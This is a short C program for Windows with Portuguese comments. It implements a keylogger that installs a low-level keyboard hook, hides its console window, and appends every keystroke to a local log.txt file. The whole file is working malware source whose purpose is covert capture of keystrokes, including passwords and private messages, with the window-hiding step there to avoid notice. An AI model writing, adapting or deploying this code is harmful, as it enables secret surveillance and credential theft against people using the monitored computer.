#include <stdio.h>
#include <Windows.h>

HHOOK hook;
FILE *logFile;  // Ponteiro para o arquivo de log

LRESULT CALLBACK FuncHook(int codigo, WPARAM wParam, LPARAM lParam);

void EsconderJanelaConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);  // Esconde a janela do console
}

int main() {
    MSG msg;

    // Abre ou cria o arquivo de log
    logFile = fopen("log.txt", "a");
    if (logFile == NULL) {
        printf("Erro ao abrir o arquivo de log!\n");
        return 1;
    }

    // Instala o gancho de teclado
    hook = SetWindowsHookExA(WH_KEYBOARD_LL, FuncHook, NULL, 0);
    if (hook == NULL) {
        printf("Erro ao instalar o gancho!\n");
        fclose(logFile);  // Fecha o arquivo de log em caso de erro
        return 1;
    }

    // Esconde a janela do console
    EsconderJanelaConsole();

    // Laço de mensagens
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Remove o gancho e fecha o arquivo de log ao finalizar
    UnhookWindowsHookEx(hook);
    fclose(logFile);

    return 0;
}

LRESULT CALLBACK FuncHook(int codigo, WPARAM wParam, LPARAM lParam) {
    if (codigo >= 0) {
        PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;

        // Verifica se uma tecla foi pressionada
        if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
            // Salva o código da tecla no arquivo de log
            fprintf(logFile, "Tecla: %c\n", kbDllHook->vkCode);
            fflush(logFile);  // Garante que o conteúdo seja salvo imediatamente
        }
    }

    // Passa o evento para o próximo gancho
    return CallNextHookEx(hook, codigo, wParam, lParam);
}

